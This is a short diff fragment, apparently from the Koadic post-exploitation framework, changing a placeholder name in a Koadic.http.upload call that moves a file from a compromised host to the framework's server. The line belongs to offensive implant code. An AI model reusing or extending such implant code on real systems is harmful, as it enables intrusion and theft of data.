@@ -1,6 +1,6 @@
 try
 {
-    Koadic.http.upload("~RFILE~", "data");
+    Koadic.http.upload("~RFILEF~", "data");
 }
 catch (e)
 {
